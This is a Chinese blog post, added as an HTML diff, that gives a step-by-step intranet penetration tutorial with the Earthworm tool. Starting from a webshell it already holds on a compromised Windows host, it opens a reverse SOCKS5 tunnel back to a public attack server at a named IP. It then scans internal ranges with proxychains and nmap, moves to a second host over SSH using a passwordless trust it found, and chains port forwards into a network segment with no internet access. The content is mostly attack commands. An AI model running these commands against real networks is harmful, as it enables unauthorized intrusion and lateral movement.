@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>内网渗透-ew | 小白帽</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="工具  Earthworm Termite reGeorg nps   环境配置  A1 - 公网攻击服务器(120.x.x.x) V1 - 出网的内网服务器(192.168.31.193&#x2F;192.158.15.10 - win7 ，80 端口存在 web 应用，通过一台花生壳对公网开放，现已获得 webshell，路由可抵达 192.168.15 段。) V2 - 不出网的内网服务器(192.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-ew">
+<meta property="og:url" content="https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/index.html">
+<meta property="og:site_name" content="小白帽">
+<meta property="og:description" content="工具  Earthworm Termite reGeorg nps   环境配置  A1 - 公网攻击服务器(120.x.x.x) V1 - 出网的内网服务器(192.168.31.193&#x2F;192.158.15.10 - win7 ，80 端口存在 web 应用，通过一台花生壳对公网开放，现已获得 webshell，路由可抵达 192.168.15 段。) V2 - 不出网的内网服务器(192.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dasdaddada23132/picture/img/20200828205303.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dasdaddada23132/picture/img/20200829202338.png">
+<meta property="article:published_time" content="2020-08-28T09:11:09.000Z">
+<meta property="article:modified_time" content="2020-09-13T15:42:02.010Z">
+<meta property="article:author" content="无名之辈">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/dasdaddada23132/picture/img/20200828205303.png">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">无名之辈</h5>
+          <a href="mailto:3389006233@qq.com" title="3389006233@qq.com" class="mail">3389006233@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/wakaka123wakaka" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">内网渗透-ew</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">内网渗透-ew</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-08-28T09:11:09.000Z" itemprop="datePublished" class="page-time">
+  2020-08-28
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+<script type="text/javascript" src="hexo_resize_image.js"></script>
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#出外网"><span class="post-toc-number">1.</span> <span class="post-toc-text">出外网</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#不出外网"><span class="post-toc-number">2.</span> <span class="post-toc-text">不出外网</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#proxychains-配置详解"><span class="post-toc-number">3.</span> <span class="post-toc-text">proxychains 配置详解</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ew"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">内网渗透-ew</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-08-28 17:11:09" datetime="2020-08-28T09:11:09.000Z"  itemprop="datePublished">2020-08-28</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <ul>
+<li><p>工具</p>
+<ul>
+<li>Earthworm</li>
+<li><a href="https://github.com/rootkiter/Termite" target="_blank" rel="noopener">Termite</a></li>
+<li><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a></li>
+<li>nps</li>
+</ul>
+</li>
+<li><p>环境配置</p>
+<ol>
+<li>A1 - 公网攻击服务器(120.x.x.x)</li>
+<li>V1 - 出网的内网服务器(192.168.31.193/192.158.15.10 - win7 ，80 端口存在 web 应用，通过一台花生壳对公网开放，现已获得 webshell，路由可抵达 192.168.15 段。)</li>
+<li>V2 - 不出网的内网服务器(192.168.15.20 - win xp ，不对公网开放，路由可抵达 192.168.15.0 段)</li>
+</ol>
+</li>
+<li><p>环境配置</p>
+<ul>
+<li>已获取 V1 的 webshell，并反弹到 A1 上。</li>
+</ul>
+</li>
+<li><p>操作</p>
+<ul>
+<li><p>反弹的六种模式</p>
+<ul>
+<li>ssocksd - 正向代理</li>
+<li>rcsocks - 反向代理 1，流量转发</li>
+<li>rssocks - 反向代理 2，反弹 socks5</li>
+<li>lcx_listen - 反向代理 1，流量转发</li>
+<li>lcx_tran - 端口转发</li>
+<li>lcx_slave - 端口绑定</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="出外网"><a href="#出外网" class="headerlink" title="出外网"></a>出外网</h2><ul>
+<li><p>正向代理</p>
+</li>
+<li><p>反向代理</p>
+<ol>
+<li>A1</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">由于场景中目标机V1没有公网IP，但是能访问公网。无法使用正向连接，可使用反弹连接的方式代理流量。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：</span><br><span class="line">.&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dasdaddada23132/picture/img/20200828205303.png" alt="image-20200828205254735"></p>
+<ol start="2">
+<li>V1</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在目标机V1上启动socks5服务，并反弹到攻击机A1的8888端口：</span><br><span class="line"> .&#x2F;ew -s rssocks -d 122.51.93.116 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dasdaddada23132/picture/img/20200829202338.png" alt=""></p>
+<p>然后可以看到 A1 中出现<code>rssocks cmd_socket OK!</code>表示流量转发成功</p>
+<ol start="3">
+<li>A1</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt install proxychains</span><br><span class="line">&#x2F;&#x2F;proxychains安装</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line"> &#x2F;&#x2F;proxychains代理配置</span><br><span class="line"></span><br><span class="line"> [ProxyList]</span><br><span class="line"> socks5    122.51.93.116    1080</span><br><span class="line"> &#x2F;&#x2F;proxychains代理配置</span><br><span class="line"></span><br><span class="line"> proxychains nmap -sT -Pn -open 192.168.1.1&#x2F;16</span><br><span class="line"> &#x2F;&#x2F;由于proxychains无法代理icmp的数据包，要加上禁ping参数-Pn（不检测主机是否存活，直接进行端口tcp扫描）</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>扫描结果发现仅能抵达 10.2 段内网机器 V2-10.10.2.111，开放了 22 以及其他端口<br>尝试对 V2 进行渗透，在 V1 上发现已设置了 V2 的免密登录，在之前 V1 反弹的 shell 中用 ssh 成功登录到 V2。</p>
+<h2 id="不出外网"><a href="#不出外网" class="headerlink" title="不出外网"></a>不出外网</h2><pre><code>现已获得V2的shell，检查发现V2不通公网，无法反向代理公网流量，需要通过V1进行多级代理。接下来将流量代理到V2上进行进一步探测。</code></pre><p>这里同样有两种方式：正向代理和反向代理。</p>
+<ul>
+<li><p>正向代理</p>
+</li>
+<li><p>反向代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：</span><br><span class="line"></span><br><span class="line">.&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">传输ew到V2上，在V2启动socks5代理并监听9999端口：</span><br><span class="line">.&#x2F;ew -s ssocksd -l 9999</span><br><span class="line">最后在V1执行，将A1的8888端口与V2的9999端口绑定，建立socks5通道：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999</span><br><span class="line">A1上proxychains代理配置：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5    0.0.0.0    1080</span><br><span class="line">&#x2F;&#x2F;proxychains代理配置</span><br><span class="line">proxychains nmap -p xxx -sT -Pn -open 10.10.2.111&#x2F;16</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="proxychains-配置详解"><a href="#proxychains-配置详解" class="headerlink" title="proxychains 配置详解"></a>proxychains 配置详解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ProxyList配置</span><br><span class="line"></span><br><span class="line">socks5    192.168.67.78    1080</span><br><span class="line">http    192.168.89.3    8080</span><br><span class="line">socks4    192.168.1.49    1080</span><br><span class="line">#设置超时时间</span><br><span class="line">tcp_read_time_out 15000</span><br><span class="line">tcp_connect_time_out 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">基本使用</span><br><span class="line">proxychains xxxx</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/bonelee/p/12511087.html" target="_blank" rel="noopener">文章来源</a></p>
+<p>——————————————————<strong><em><a href="https://hack123.pw/" target="_blank" rel="noopener">无名之辈</a></em></strong>——————————————————-</p>
+<hr>
+<p><sub>本文档由<a href="https://www.yuque.com/waquehq">瓦雀</a>创建</sub></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-09-13T15:42:02.010Z" itemprop="dateUpdated">2020-09-13 23:42:02</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2020/08/28/ew/" target="_blank" rel="external">https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://www.yuque.com/xiaogege-yxttw">
+            <img src="/img/avatar.jpg" alt="无名之辈">
+            无名之辈
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&title=《内网渗透-ew》 — 小白帽&pic=https://www.yuque.com/xiaogege-yxttw/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&title=《内网渗透-ew》 — 小白帽&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《内网渗透-ew》 — 小白帽&url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&via=https://www.yuque.com/xiaogege-yxttw" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/08/29/fantanshell/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">常用反弹shell</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/08/28/dasd/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">markdown语法</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>无名之辈 &copy; 2020</span>
+            <span>
+                
+                <a href="http://www.miitbeian.gov.cn/" target="_blank">蜀ICP备巴啦啦小魔仙</a><br>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+	<center><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span></center>
+		<script>
+				var now = new Date(); 
+					function createtime() { 
+                    var grt= new Date("01/07/2020 17:38:00");//在此处修改你的建站时间
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+											} 
+			setInterval("createtime()",250);
+		</script>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&title=《内网渗透-ew》 — 小白帽&pic=https://www.yuque.com/xiaogege-yxttw/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&title=《内网渗透-ew》 — 小白帽&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《内网渗透-ew》 — 小白帽&url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/&via=https://www.yuque.com/xiaogege-yxttw" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLElEQVR42u3awW7EIAxF0fn/n06lbqcw99lp1ZjLalQlwMnCNdivFx7X93j/vfoLf/f9yf0zrSFDhozHMq7tqC2Qssm6q2dkyJBxDoNsZbXM/nkCWL1F9iZDhgwZ6e/0o/DPJEOGDBk1Bj+IdsAyZMiQwQ+xte2StI+8ddtZXIYMGQ9kdK7Pfvv3H9U3ZMiQ8Y8ZVzjIu2khgYfX5YoyZMgYzehfdfFSJYFxNspwZciQMYJx1/GVb5EE8f3H/WFFGTJkjGZ0Gil4aSGdh39WGTJknMyoheA0aN51lJUhQ8ZsRno1T7a1Txz5JwhKFDJkyBjN4E1ana2nl2tpWUKGDBmzGenBlRcP7i0MfNihDBkyjmekl2t3bTEIxDJkyDiMwS/0SUMYD7idBg4ZMmTMZqShLb2e6ySI8VlchgwZQxk8+eMlxg4gbdGQIUPGCQxedOThjxcSeMKHLvtkyJBxACO9Pus0WKQl0qDZQoYMGaMZnWYL8iS/gCsGbhkyZAxl1A6WtSaMWkEUHWhlyJBxDINPtw+atVSvtnrwP0GGDBmPZaSTpu0UQWMEHjJkyDiNcYWDX+7XypNpUrhMDWXIkDGIUQtzvACZFkc7a8mQIWM2g0+dLp8ekjuppwwZMk5g8CBLjrjplVmtsUOGDBkyOkEwDdzp0VSGDBkyOqkemSEto6LZZMiQcQCjFgo7sFoq+SE1lCFDxlBGrcWBJ4gkrKdtYcXWDRkyZDyP8QV7ZjziDz0SngAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+lazyScripts.push('//s95.cnzz.com/z_stat.php?id=1279224744&web_id=1279224744')
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+	<script type="text/javascript" src="hexo_resize_image.js"></script>
+</body>
+</html>
